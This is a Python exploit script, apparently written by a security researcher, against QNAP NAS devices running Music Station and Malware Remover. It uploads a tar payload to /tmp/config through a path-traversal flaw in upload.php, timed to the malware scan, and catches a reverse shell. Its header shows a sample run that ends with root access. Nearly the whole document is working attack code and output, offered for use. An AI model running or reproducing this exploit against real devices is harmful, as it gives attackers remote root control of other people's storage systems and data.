#!/usr/bin/env python3
# coding: utf8
#
# $ ./$0.py -rh http://172.16.42.178:8080 -lh 172.16.42.114 -sh 19 -sm 16 -tf a.tar
# 2020-10-26 19:14:18,761 - INFO - sleeping for 41.23835 seconds to wait for 19:16:00 minus 1 minute...
# 2020-10-26 19:15:00,001 - INFO - starting remote shell handler...
# 2020-10-26 19:15:00,004 - INFO - continously uploading jpg with payload in background...
# bash: no job control in this shell
# bash-3.2# id
# id
# uid=0(admin) gid=0(administrators) groups=0(administrators),100(everyone)
# bash-3.2# exit
# exit
# exit
# *** Connection closed by remote host ***
#
# NOTE: 
#   remember to clean the QNAP environment once finished:
#       `rm /tmp/config/polict*`
#   (both before and after the end of scan since /tmp/config is mounted)
#
# tested on:
#   QNAP TS-251+
#   QTS 4.5.1.1465 build 20201024 (latest) 
#   Malware Remove 4.6.0.1 (latest, pre-installed in QTS)
#   Musicstation 5.3.13 (latest, 5M+ installs in AppCenter)
# 
# polict, 26/10/2020

import sys, time
import requests 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS='ALL'
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
import logging.handlers
import datetime
from argparse import ArgumentParser
import socket
import telnetlib
from threading import Thread

### default settings
DEFAULT_LPORT = 8383

### argument parsing
parser = ArgumentParser()
parser.add_argument("-rh", "--rhost", dest="rhost", required=True,
            help="remote QNAP webroot, e.g.: http://10.10.10.11:8080/")
parser.add_argument("-lh", '--lhost', dest="lhost",
            help="local ip to use for remote shell connect-back",
            required=True)
parser.add_argument("-lp", '--lport', dest="lport",
            help="local port to use for remote shell connect-back",
            default=DEFAULT_LPORT)
parser.add_argument("-sh", '--scan-hours', dest="scan_hours",
            help="scan start hour in base 24, e.g. 19",
            default=19, type=int)
parser.add_argument("-sm", '--scan-minutes', dest="scan_minutes",
            help="scan start hour in base 60, e.g. 32",
            default=0, type=int)
parser.add_argument("-tf", '--tar-file', dest="tar_file",
            help="tar file to upload",
            required=True)
parser.add_argument("-d", "--debug", dest="debug_mode",
            action="store_true",
            help="enable debug mode")
args = parser.parse_args()

log = logging.getLogger(__name__)
if args.debug_mode:
    log.setLevel(logging.DEBUG)
else:
    log.setLevel(logging.INFO)

handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
log.addHandler(handler)

### actual exploit logic
def upload_payload_jpg():
    global args
    """
    POST /musicstation/api/upload.php?arttype=../../../../../../tmp/config/polict.tar HTTP/1.1
    Host: 172.16.42.178:8080
    Content-Type: multipart/form-data; boundary=---------------------------370886533913425575884105127477
    Content-Length: 18670
    Connection: close

    -----------------------------370886533913425575884105127477
    Content-Disposition: form-data; name="singleFile"; filename="polict.png"
    Content-Type: application/octet-stream

    <tar stuff>
    -----------------------------370886533913425575884105127477--
    """
    url = args.rhost + "/musicstation/api/upload.php?arttype=../../../../../../tmp/config/polict.tar"
    
    files = {'singleFile': ('polict.png', open(args.tar_file,"rb"), 'application/octet-stream')}
    r = requests.post(url, files=files, verify=False)
    log.debug("req ret: {}".format(r))

def handler():
    global args
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", args.lport))
    s.listen(1)
    conn, addr = s.accept()
    log.debug("Connection from %s %s received!" % (addr[0], addr[1]))
    t.sock = conn
    t.interact()

def wait_for_reverse_shell():
    handlerthr = Thread(target=handler)
    handlerthr.start()

if __name__ == '__main__':
    scan_time = datetime.time(args.scan_hours, args.scan_minutes)
    sleep_time = (datetime.datetime.combine(datetime.date.min, scan_time) - datetime.datetime.combine(datetime.date.min, datetime.datetime.now().time()) - datetime.timedelta(seconds=60)).total_seconds()
    # handle next day correctly
    if sleep_time < 0:
        sleep_time += 24*60*60
    log.info("sleeping for {} seconds to wait for {} minus 1 minute...".format(sleep_time, scan_time))
    time.sleep(sleep_time)
    log.info("starting remote shell handler...")
    wait_for_reverse_shell()
    log.info("continously uploading jpg with payload in background...")
    while datetime.datetime.now() < (datetime.datetime.now() + datetime.timedelta(minutes=5)):
        upload_payload_jpg()